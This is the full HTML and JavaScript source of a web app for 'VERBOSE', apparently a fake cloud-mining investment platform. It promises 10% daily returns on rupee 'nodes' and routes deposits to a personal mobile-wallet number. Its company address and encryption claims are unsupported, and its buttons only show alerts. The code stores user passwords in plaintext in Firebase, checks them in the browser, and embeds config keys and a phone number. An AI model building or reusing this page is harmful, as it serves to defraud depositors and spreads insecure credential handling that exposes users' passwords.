<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Quantum Cloud Infrastructure</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.03); --border: rgba(255,255,255,0.08); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.3s; font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }

  /* AUTH SCREEN */
  #authPage { position: fixed; inset: 0; background: var(--bg); z-index: 20000; padding: 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
  .auth-card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--border); padding: 40px; border-radius: 40px; backdrop-filter: blur(30px); text-align: center; }
  
  /* DASHBOARD UI */
  header { text-align: center; padding: 45px 20px 10px; cursor: pointer; }
  .logo-text { font-size: 32px; font-weight: 800; letter-spacing: 12px; text-shadow: 0 0 25px var(--neon); color: #fff; }
  .page { max-width: 450px; margin: 0 auto; padding: 10px 20px 140px; display: none; }
  .active { display: block !important; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
  .stat-card { background: var(--card); border: 1px solid var(--border); padding: 18px; border-radius: 25px; }
  .stat-card small { font-size: 9px; opacity: 0.5; text-transform: uppercase; letter-spacing: 1px; }
  .stat-card div { font-size: 16px; font-weight: 800; margin-top: 5px; color: var(--neon); }

  /* NODE ICONS */
  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 15px; display: flex; align-items: center; gap: 15px; margin-bottom: 12px; }
  .node-icon { width: 50px; height: 50px; background: rgba(0,247,255,0.05); border: 1px solid var(--neon); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
  
  /* HISTORY & POLICY */
  .list-item { background: rgba(255,255,255,0.02); padding: 15px; border-radius: 20px; margin-bottom: 10px; font-size: 11px; border-left: 3px solid var(--accent); }
  .policy-text { font-size: 11px; opacity: 0.6; line-height: 1.8; text-align: justify; }

  /* INPUTS & NAV */
  input { width: 100%; padding: 16px; margin-top: 10px; border-radius: 18px; border: 1px solid var(--border); background: rgba(255,255,255,0.02); color: #fff; font-size: 13px; }
  .btn-primary { width: 100%; padding: 16px; border-radius: 18px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; margin-top: 15px; }
  
  .nav { position: fixed; bottom: 25px; left: 15px; right: 15px; background: rgba(10,10,10,0.95); backdrop-filter: blur(20px); display: none; justify-content: space-around; padding: 20px; border-radius: 35px; border: 1px solid var(--border); z-index: 1000; }
  .nav-item { font-size: 8px; opacity: 0.4; font-weight: 800; cursor: pointer; color: #fff; text-transform: uppercase; }
  .nav-item.active { opacity: 1; color: var(--neon); }
</style>
</head>
<body>

<div id="authPage">
    <div class="auth-card">
        <div class="logo-text" style="font-size:24px;">VERBOSE</div>
        <p style="font-size:9px; opacity:0.4; letter-spacing:3px; margin-top:10px;">QUANTUM ACCESS PORTAL</p>
        <div id="authBox">
            <input id="authName" placeholder="Full Name (For New Users)">
            <input id="authPhone" type="number" placeholder="Phone Number (Node ID)">
            <input id="authPass" type="password" placeholder="Access Password">
            <div style="margin-top:15px; display:flex; align-items:center; gap:10px;">
                <input type="checkbox" id="terms" style="width:20px; margin:0;">
                <label for="terms" style="font-size:10px; opacity:0.6;">I agree to Privacy Policy</label>
            </div>
            <button class="btn-primary" onclick="handleAuth()">LOGIN / REGISTER</button>
            <a href="https://wa.me/923705519562" style="display:block; margin-top:20px; font-size:10px; color:var(--success); text-decoration:none; font-weight:800;">⚡ FORGOT PASSWORD? CHAT SUPPORT</a>
        </div>
    </div>
</div>

<header id="adminTrigger">
    <div class="logo-text">VERBOSE</div>
</header>

<div id="dash" class="page">
    <div class="stat-grid">
        <div class="stat-card" style="grid-column: span 2; border-color: var(--neon); background: linear-gradient(135deg, #0a0a0a, #000);">
            <small>Active Balance</small>
            <div style="font-size:28px;">PKR <span id="uBal">0.00</span></div>
            <p id="uNameDisplay" style="font-size:10px; margin:10px 0 0; opacity:0.5;"></p>
        </div>
        <div class="stat-card"><small>Daily Profit</small><div id="uDaily">0.00</div></div>
        <div class="stat-card"><small>Total Mining</small><div id="uTotal">0.00</div></div>
    </div>
    
    <h3 style="font-size:11px; letter-spacing:2px; opacity:0.7;">MINING NODES (25 ONLINE)</h3>
    <div id="nodeGrid"></div>
</div>

<div id="history" class="page">
    <h3 style="font-size:14px; letter-spacing:2px;">TRANSACTION LOGS</h3>
    <div id="logsList">
        <div class="list-item">No transactions found in cloud database.</div>
    </div>
</div>

<div id="finance" class="page">
    <div class="stat-card" style="margin-bottom:15px;">
        <h3>DEPOSIT ASSETS</h3>
        <p style="font-size:10px; opacity:0.6;">SadaPay/JazzCash: 03705519562</p>
        <input id="dAmt" type="number" placeholder="Amount PKR">
        <input id="dTID" placeholder="TID Number">
        <button class="btn-primary" onclick="alert('Sent for verification!')">DEPOSIT NOW</button>
    </div>
    <div class="stat-card">
        <h3>WITHDRAW</h3>
        <input id="wAmt" type="number" placeholder="Amount PKR">
        <input id="wNum" placeholder="Account Number">
        <button class="btn-primary" style="background:var(--error);" onclick="alert('Pending Admin Approval!')">WITHDRAW</button>
    </div>
</div>

<div id="policy" class="page">
    <h3>ABOUT VERBOSE</h3>
    <p class="policy-text">VERBOSE Technology LLC is a New York-based quantum cloud infrastructure provider. We offer high-performance cloud mining nodes for global users. Registered: 244 Madison Ave, NY.</p>
    <h3>PRIVACY POLICY</h3>
    <p class="policy-text">1. Your data is encrypted with AES-256.<br>2. Withdrawals take 1-24 hours.<br>3. Multiple accounts are strictly prohibited.<br>4. Deposit confirmation requires a valid TID.</p>
</div>

<nav class="nav" id="mainNav">
    <div class="nav-item active" onclick="tab('dash', this)">Home</div>
    <div class="nav-item" onclick="tab('history', this)">History</div>
    <div class="nav-item" onclick="tab('finance', this)">Wallet</div>
    <div class="nav-item" onclick="tab('policy', this)">About</div>
    <div class="nav-item" onclick="logout()" style="color:var(--error);">Logout</div>
</nav>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, set, update, onValue, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  let user = localStorage.getItem('v_user');

  // --- RENDER 25 NODES ---
  const icons = ["📡", "🛰️", "🚀", "🧬", "💎", "⚡", "🌀", "🛰️", "🛸"];
  const grid = document.getElementById('nodeGrid');
  for(let i=1; i<=25; i++) {
    let price = 500 * i;
    grid.innerHTML += `
      <div class="node-card">
        <div class="node-icon">${icons[i % icons.length]}</div>
        <div class="node-info">
            <h4>Cloud Node v.${i}</h4>
            <p>PKR ${price} | Daily: PKR ${50*i}</p>
        </div>
        <button onclick="alert('Investment Initiated!')" style="background:var(--neon); border:none; padding:8px 12px; border-radius:10px; font-size:9px; font-weight:800; margin-left:auto; cursor:pointer;">BUY</button>
      </div>`;
  }

  // --- AUTH LOGIC ---
  window.handleAuth = async () => {
    const name = document.getElementById('authName').value;
    const phone = document.getElementById('authPhone').value;
    const pass = document.getElementById('authPass').value;
    const terms = document.getElementById('terms').checked;

    if(!phone || !pass || !terms) return alert("Fill all details and accept terms, sweetie!");

    const userRef = ref(db, `users/${phone}`);
    const snap = await get(userRef);

    if(snap.exists()) {
        if(snap.val().pass === pass) {
            localStorage.setItem('v_user', phone);
            location.reload();
        } else alert("Invalid Password!");
    } else {
        if(!name) return alert("Please enter your name for first-time registration!");
        await set(userRef, { name, pass, balance: 0, daily: 0, total: 0, status: 'Active' });
        localStorage.setItem('v_user', phone);
        location.reload();
    }
  };

  // --- CORE SYSTEM ---
  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
  };

  window.logout = () => { localStorage.clear(); location.reload(); };

  if(user) {
    document.getElementById('authPage').style.display = 'none';
    document.getElementById('mainNav').style.display = 'flex';
    document.getElementById('dash').classList.add('active');
    onValue(ref(db, `users/${user}`), s => {
        const d = s.val();
        document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
        document.getElementById('uDaily').innerText = (d.daily || 0).toLocaleString();
        document.getElementById('uTotal').innerText = (d.total || 0).toLocaleString();
        document.getElementById('uNameDisplay').innerText = "Operator: " + d.name;
    });
  }
</script>
</body>
</html>
